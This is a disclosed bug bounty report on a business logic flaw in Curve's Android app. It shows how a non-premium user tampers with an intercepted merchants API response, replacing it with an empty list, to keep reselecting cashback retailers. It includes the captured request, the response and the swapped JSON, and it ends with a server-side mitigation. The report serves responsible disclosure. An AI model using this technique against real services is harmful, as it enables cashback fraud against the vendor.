# Business Logic Flaw - A non premium user can change/update retailers to get cashback on all the retailers associated with Curve

## Report Details
- **Report ID**: 672487
- **URL**: https://hackerone.com/reports/672487
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-08-13T15:07:44.127Z
- **Disclosed**: 2020-07-24T12:28:59.396Z

## Reporter
- **Username**: praseudo7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curve

## Vulnerability Information
Hi,

While testing your android application I've found a business logic flaw by using which a non premium user can update/change the retailers when ever and what ever retailers he wants to.

Curve application has a functionality called "Earn curve cash". A non premium user can select only 3 retailers (where as premium user can select 6 or more retailers) at a time. A business logic flaw exists at this endpoint by using which a non premium user can update/change already existing retailers and can use cashback with all the retailers associated with curve application.

Steps to reproduce:
=============

1] Login to non premium user account 
2] Navigate to "Earn curve cash" and you can select only 3 retailers (because you are non premium user)
3] And click on "Confirm"
4] You have now added 3 retailers to your account and you dont have any option to edit/update the added retailers.
5] Now go back to "Earn curve cash" functionality and make sure to capture the request and response

Request:
======
```
GET /v1/rewards/users/programs/e329e463-7f5d-4358-9109-4f97c9f86abd/merchants HTTP/1.1
Accept: application/json
Curve-UserAgent: Android;Genymotion;Custom Phone
Curve-AppAndVersion: Curve Android 2.9.0
crv-user-agent: Android 2.9.0/20900
Authorization: APE7kg446BXw2iFEI6Ca079RaGrJ3bcelA9DKDoUFUA
crv-idempotency-key: a161ccfc-077c-4099-a180-ebbbacb50da6
crv-request-id: 88fb2296-46f4-49e4-858f-8aff312a9587
crv-correlation-id: android-98600fe2-6b09-48d8-94b1-cecf73094c43
Host: api.imaginecurve.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.12.2
```

Response:
=======
```
HTTP/1.1 200 OK
Date: Tue, 13 Aug 2019 14:55:30 GMT
Content-Type: application/json
Connection: close
server: envoy
cache-control: no-cache, private
set-cookie: device_view=full; expires=Fri, 13-Sep-2019 14:55:30 GMT; Max-Age=2678400; path=/; HttpOnly
x-envoy-upstream-service-time: 48
Content-Length: 734

{"success":true,"data":{"merchants":[{"id":"7603f8b7-407c-4234-9153-7fe3b29863ed","name":"Waitrose","alias":"waitrose","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1},{"id":"ca6daefd-f772-4286-9d70-504b094a98b8","name":"Whole Foods","alias":"wholefoods","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1},{"id":"efb47f27-d905-4047-889c-f4da68e5a9b3","name":"Tesco","alias":"tesco","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1}]}}
```

6] Now change the response body with below JSON content and turn off the burp interception

```
{"success":true,"data":{"merchants":[]}}
```

7] Now you can again select any three new retailers and click on "Confirm"
8] You have now successfully updated/changed the retailers and can use the cashback on all the retailers associated with curve application.

For better understanding I've attached video POC below.

{F554505}

## Impact

A non premium user can miss-use the business logic and can use cashback's with all the merchants associated with the curve application.

Mitigation:
========
Make sure to validate the responses and user based authorization for each endpoint on the server-side.


Regards,
Praseudo

## Attachments
- curve_business_logic.mp4
